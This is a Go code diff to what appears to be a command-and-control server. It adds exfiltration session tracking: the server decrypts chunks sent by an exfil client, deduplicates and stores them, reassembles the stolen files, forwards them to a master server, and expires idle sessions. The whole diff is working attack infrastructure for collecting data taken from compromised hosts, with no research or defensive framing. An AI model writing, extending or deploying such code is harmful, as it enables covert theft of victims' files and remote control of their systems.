@@ -67,6 +67,24 @@ type ExpectedResult struct {
 	LastChunkIndex int      // Track last chunk received for progress calculation
 }
 
+// ExfilSession tracks per-session metadata for dedicated exfil client uploads
+type ExfilSession struct {
+	SessionID      string
+	JobID          string
+	FileName       string
+	FileSize       uint64
+	TotalChunks    uint32
+	ReceivedCount  int
+	ReceivedChunks map[uint32]bool
+	PendingChunks  map[uint32][]byte
+	Status         string
+	ClientIP       string
+	Note           string
+	CreatedAt      time.Time
+	LastActivity   time.Time
+	LastChunkAt    time.Time
+}
+
 // StagerSession tracks a stager deployment session
 type StagerSession struct {
 	ClientIP        string
@@ -89,6 +107,7 @@ type C2Manager struct {
 	masterTaskIDs        map[string]string               // key: local taskID, value: master taskID
 	resultChunks         map[string][]ResultChunk        // key: taskID (legacy)
 	expectedResults      map[string]*ExpectedResult      // key: taskID (new two-phase)
+	exfilSessions        map[string]*ExfilSession        // key: session hex string
 	stagerSessions       map[string]*StagerSession       // key: clientIP
 	cachedStagerSessions map[string]*CachedStagerSession // key: sessionID (for cache-based sessions)
 	recentMessages       map[string]time.Time            // key: message hash, value: timestamp (deduplication)
@@ -140,6 +159,7 @@ func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter, d
 		masterTaskIDs:        make(map[string]string),
 		resultChunks:         make(map[string][]ResultChunk),
 		expectedResults:      make(map[string]*ExpectedResult),
+		exfilSessions:        make(map[string]*ExfilSession),
 		stagerSessions:       make(map[string]*StagerSession),
 		cachedStagerSessions: make(map[string]*CachedStagerSession),
 		recentMessages:       make(map[string]time.Time),
@@ -488,6 +508,33 @@ func (c2 *C2Manager) cleanupExpiredSessions() {
 			c2.mutex.Unlock()
 		}
 
+		// Clean up exfil sessions that have gone quiet
+		type expiredExfil struct {
+			id   string
+			idle time.Duration
+		}
+		c2.mutex.Lock()
+		var expiredExfilSessions []expiredExfil
+		for sessionID, session := range c2.exfilSessions {
+			if idle := now.Sub(session.LastActivity); idle > ExfilSessionTimeout {
+				expiredExfilSessions = append(expiredExfilSessions, expiredExfil{id: sessionID, idle: idle})
+				delete(c2.exfilSessions, sessionID)
+			}
+		}
+		c2.mutex.Unlock()
+		for _, expired := range expiredExfilSessions {
+			if c2.debug {
+				logf("[Exfil] Cleaned up inactive session %s (idle %v)", expired.id, expired.idle)
+			}
+			if c2.db != nil {
+				go func(id string) {
+					if err := c2.db.UpdateExfilSessionStatus(id, "timeout"); err != nil && c2.debug {
+						logf("[Exfil] Failed to mark session %s timed out: %v", id, err)
+					}
+				}(expired.id)
+			}
+		}
+
 		// Clean up expired expected results, but save partial results first
 		// Collect expired results first (with lock)
 		type expiredResult struct {
@@ -593,6 +640,246 @@ func (c2 *C2Manager) decodeBeaconData(encoded string) (string, error) {
 	}
 
 	return decoded, nil
+}
+
+// handleExfilChunk ingests a dedicated exfil client's chunk and tracks session progress.
+func (c2 *C2Manager) handleExfilChunk(encoded string, meta *ExfilMetadata, clientIP string) (bool, error) {
+	plaintext, err := decodeAndDecryptBytes(encoded, c2.aesKey)
+	if err != nil {
+		return false, fmt.Errorf("exfil decrypt failed: %w", err)
+	}
+
+	if meta.PayloadLen != 0 && int(meta.PayloadLen) != len(plaintext) && c2.debug {
+		logf("[Exfil] Payload length mismatch (expected %d, got %d)", meta.PayloadLen, len(plaintext))
+	}
+
+	sessionID := fmt.Sprintf("%08x", meta.SessionID)
+	jobID := fmt.Sprintf("%08x", meta.JobID)
+	session := c2.ensureExfilSession(sessionID, jobID, clientIP)
+
+	if meta.IsHeader() || meta.ChunkIndex == ExfilHeaderChunkIndex {
+		c2.handleExfilHeader(session, meta, plaintext)
+		if c2.debug {
+			logf("[Exfil] header session=%s job=%s name=%s size=%d chunks=%d", sessionID, jobID, session.FileName, session.FileSize, session.TotalChunks)
+		}
+		return true, nil
+	}
+
+	// Ensure per-session dedupe map exists
+	var duplicate bool
+
+	c2.mutex.Lock()
+	if session.ReceivedChunks == nil {
+		session.ReceivedChunks = make(map[uint32]bool)
+	}
+	if session.ReceivedChunks[meta.ChunkIndex] {
+		duplicate = true
+	} else {
+		session.ReceivedChunks[meta.ChunkIndex] = true
+		session.LastActivity = time.Now()
+	}
+	// Update total chunk hint if provided
+	if session.TotalChunks == 0 && meta.TotalChunks != 0 {
+		session.TotalChunks = meta.TotalChunks
+	}
+	c2.mutex.Unlock()
+
+	if duplicate {
+		return true, nil
+	}
+
+	inserted := true
+	if c2.db != nil {
+		var dbErr error
+		inserted, dbErr = c2.db.RecordExfilChunk(sessionID, meta.ChunkIndex, plaintext)
+		if dbErr != nil {
+			c2.mutex.Lock()
+			delete(session.ReceivedChunks, meta.ChunkIndex)
+			c2.mutex.Unlock()
+			return false, fmt.Errorf("failed to persist exfil chunk: %w", dbErr)
+		}
+		if !inserted {
+			// Chunk already on disk (likely due to retry) - treat as duplicate
+			return true, nil
+		}
+	} else {
+		c2.mutex.Lock()
+		if session.PendingChunks == nil {
+			session.PendingChunks = make(map[uint32][]byte)
+		}
+		session.PendingChunks[meta.ChunkIndex] = append([]byte(nil), plaintext...)
+		c2.mutex.Unlock()
+	}
+
+	now := time.Now()
+	c2.mutex.Lock()
+	session.ReceivedCount++
+	session.LastChunkAt = now
+	if session.Status == "" {
+		session.Status = "receiving"
+	}
+	received := session.ReceivedCount
+	total := session.TotalChunks
+	c2.mutex.Unlock()
+
+	c2.persistExfilSession(session)
+
+	if masterClient != nil {
+		go c2.submitExfilChunkToMaster(session, meta, plaintext)
+	}
+
+	if meta.IsFinal() || (total > 0 && received >= int(total)) {
+		go c2.finalizeExfilSession(session)
+	}
+
+	if c2.debug {
+		logf("[Exfil] chunk session=%s job=%s idx=%d/%d bytes=%d ip=%s", sessionID, jobID, meta.ChunkIndex, session.TotalChunks, len(plaintext), clientIP)
+	}
+
+	return true, nil
+}
+
+func (c2 *C2Manager) ensureExfilSession(sessionID, jobID, clientIP string) *ExfilSession {
+	now := time.Now()
+	c2.mutex.Lock()
+	defer c2.mutex.Unlock()
+
+	session, exists := c2.exfilSessions[sessionID]
+	if !exists {
+		session = &ExfilSession{
+			SessionID:      sessionID,
+			JobID:          jobID,
+			ClientIP:       clientIP,
+			Status:         "receiving",
+			CreatedAt:      now,
+			LastActivity:   now,
+			ReceivedChunks: make(map[uint32]bool),
+		}
+		c2.exfilSessions[sessionID] = session
+	} else {
+		if session.JobID == "" && jobID != "" {
+			session.JobID = jobID
+		}
+		if session.ClientIP == "" {
+			session.ClientIP = clientIP
+		}
+		session.LastActivity = now
+		if session.ReceivedChunks == nil {
+			session.ReceivedChunks = make(map[uint32]bool)
+		}
+	}
+
+	return session
+}
+
+func (c2 *C2Manager) handleExfilHeader(session *ExfilSession, meta *ExfilMetadata, payload []byte) {
+	c2.mutex.Lock()
+	if meta != nil {
+		if meta.Name != "" {
+			session.FileName = meta.Name
+		}
+		if meta.FileSize != 0 {
+			session.FileSize = meta.FileSize
+		}
+		if meta.TotalChunks != 0 {
+			session.TotalChunks = meta.TotalChunks
+		}
+	}
+	if len(payload) > 0 {
+		session.Note = string(payload)
+	}
+	if session.Status == "" {
+		session.Status = "receiving"
+	}
+	session.LastActivity = time.Now()
+	c2.mutex.Unlock()
+
+	c2.persistExfilSession(session)
+}
+
+func (c2 *C2Manager) persistExfilSession(session *ExfilSession) {
+	if c2.db == nil || session == nil {
+		return
+	}
+
+	c2.mutex.RLock()
+	record := &ExfilSessionRecord{
+		SessionID:      session.SessionID,
+		JobID:          session.JobID,
+		FileName:       session.FileName,
+		FileSize:       int64(session.FileSize),
+		TotalChunks:    int(session.TotalChunks),
+		ReceivedChunks: session.ReceivedCount,
+		Status:         session.Status,
+		Note:           session.Note,
+		ClientIP:       session.ClientIP,
+		CreatedAt:      session.CreatedAt,
+		UpdatedAt:      time.Now(),
+		LastChunkAt:    session.LastChunkAt,
+	}
+	c2.mutex.RUnlock()
+	if record.Status == "" {
+		record.Status = "receiving"
+	}
+	if err := c2.db.UpsertExfilSession(record); err != nil && c2.debug {
+		logf("[Exfil] Failed to persist session %s: %v", record.SessionID, err)
+	}
+}
+
+func (c2 *C2Manager) submitExfilChunkToMaster(session *ExfilSession, meta *ExfilMetadata, payload []byte) {
+	if masterClient == nil || session == nil || meta == nil {
+		return
+	}
+
+	c2.mutex.RLock()
+	req := ExfilChunkRequest{
+		SessionID:   session.SessionID,
+		JobID:       session.JobID,
+		ChunkIndex:  int(meta.ChunkIndex),
+		TotalChunks: int(session.TotalChunks),
+		PayloadB64:  base64.StdEncoding.EncodeToString(payload),
+		FileName:    session.FileName,
+		FileSize:    int64(session.FileSize),
+		IsFinal:     meta.IsFinal(),
+	}
+	c2.mutex.RUnlock()
+
+	if err := masterClient.SubmitExfilChunk(req); err != nil && c2.debug {
+		logf("[Exfil] Failed to forward chunk %d for session %s: %v", meta.ChunkIndex, session.SessionID, err)
+	}
+}
+
+func (c2 *C2Manager) finalizeExfilSession(session *ExfilSession) {
+	if session == nil {
+		return
+	}
+
+	c2.mutex.Lock()
+	if session.Status == "completed" {
+		c2.mutex.Unlock()
+		return
+	}
+	session.Status = "completed"
+	session.LastActivity = time.Now()
+	c2.mutex.Unlock()
+
+	c2.persistExfilSession(session)
+
+	if masterClient != nil {
+		c2.mutex.RLock()
+		req := ExfilCompleteRequest{
+			SessionID:      session.SessionID,
+			JobID:          session.JobID,
+			FileName:       session.FileName,
+			FileSize:       int64(session.FileSize),
+			TotalChunks:    int(session.TotalChunks),
+			ReceivedChunks: session.ReceivedCount,
+		}
+		c2.mutex.RUnlock()
+		if err := masterClient.MarkExfilComplete(req); err != nil && c2.debug {
+			logf("[Exfil] Failed to notify master of completion for %s: %v", session.SessionID, err)
+		}
+	}
 }
 
 // isLegitimateSubdomain determines if a DNS subdomain represents legitimate traffic
